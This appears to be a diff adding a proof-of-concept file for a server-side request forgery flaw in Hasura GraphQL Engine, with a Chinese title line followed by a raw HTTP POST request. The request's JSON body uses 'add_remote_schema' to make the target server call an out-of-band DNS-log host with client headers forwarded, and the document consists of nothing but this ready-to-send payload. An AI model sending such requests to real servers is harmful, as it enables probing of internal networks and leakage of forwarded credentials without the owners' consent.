@@ -1,0 +1,28 @@
+# Hasura GraphQL Engine服务器请求伪造漏洞
+# Hasura GraphQL Engine存在SSRF漏洞
+POST /v1/query?acid=80001706&bid=hd_tag_m8mv25h1 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25h1
+RM-PRO-Token: 73f6822a9b428f1856bbafd7495c31c5
+RM-PRO-Time: 1742808468196
+User-Agent: curl/7.83.1
+Content-Type: application/json
+
+{
+   "type":"bulk",
+   "args":[
+      {
+         "type":"add_remote_schema",
+         "args":{
+            "name":"test",
+            "definition":{
+               "url":"https://xxx.dnslog.cn",
+               "headers":[
+               ],
+               "timeout_seconds":60,
+               "forward_client_headers":true
+            }
+         }
+      }
+   ]
+}
